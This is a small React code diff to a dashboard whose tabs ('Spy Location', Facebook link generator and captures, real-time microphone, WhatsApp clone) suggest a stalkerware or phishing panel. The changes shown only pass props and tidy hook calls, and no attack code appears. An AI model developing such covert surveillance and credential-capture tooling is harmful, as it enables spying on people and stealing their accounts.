@@ -375,7 +375,7 @@ function WhatsAppWebSim({ onBack }) {
   );
 }
 
-function WhatsAppSim() {
+function WhatsAppSim(props) {
   const [option, setOption] = useState('clone');
   const [phone, setPhone] = useState('');
   const [device, setDevice] = useState('');
@@ -521,7 +521,7 @@ function WhatsAppSim() {
 
 export default function Dashboard({ email }) {
   const [active, setActive] = useState(() => localStorage.getItem('dashboardActiveTab') || 'Spy Location');
-  const [showLoadMoreMsg, setShowLoadMoreMsg] = React.useState(false);
+  const [showLoadMoreMsg, setShowLoadMoreMsg] = useState(false);
 
   useEffect(() => {
     localStorage.setItem('dashboardActiveTab', active);
@@ -551,7 +551,7 @@ export default function Dashboard({ email }) {
             {active === 'Spy Location' && <><LinkGenerator /><LinksList /></>}
             {active === 'Facebook' && <><LinkGenerator onlyFacebook /><FacebookCaptures /></>}
             {active === 'Real-time Microphone' && <MicrophonePlaceholder />}
-            {active === 'WhatsApp' && <WhatsAppSim onBack={() => setShowLoadMoreMsg(false)} />}
+            {active === 'WhatsApp' && <WhatsAppSim onBack={() => setShowLoadMoreMsg(false)} showLoadMoreMsg={showLoadMoreMsg} setShowLoadMoreMsg={setShowLoadMoreMsg} />}
             {active !== 'Spy Location' && active !== 'Facebook' && active !== 'Real-time Microphone' && active !== 'WhatsApp' && (
               <div style={{
                 background: 'var(--fundo-destaque)',
